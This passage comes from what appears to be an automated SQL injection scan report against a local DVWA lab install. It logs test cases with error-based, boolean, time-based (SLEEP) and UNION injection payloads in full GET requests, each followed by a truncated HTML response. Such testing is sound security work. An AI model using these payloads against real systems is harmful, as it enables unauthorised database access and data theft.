+</div><hr><h3>Test ID: ERROR_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.352921<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CONVERT(int, (SELECT @@version))--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=31
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.399424<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=30
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_HIGH_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.445468<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=29
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_HIGH_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.493701<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=28
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.541755<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=27
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.586830<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=26
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.633836<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=25
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.679261<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=24
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.726482<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='b&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=23
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.774124<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=22
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.817131<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=21
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.864318<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=20
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.895844<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(1=1, SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=19
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_HIGH_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.941427<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=18
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.978800<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=17
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
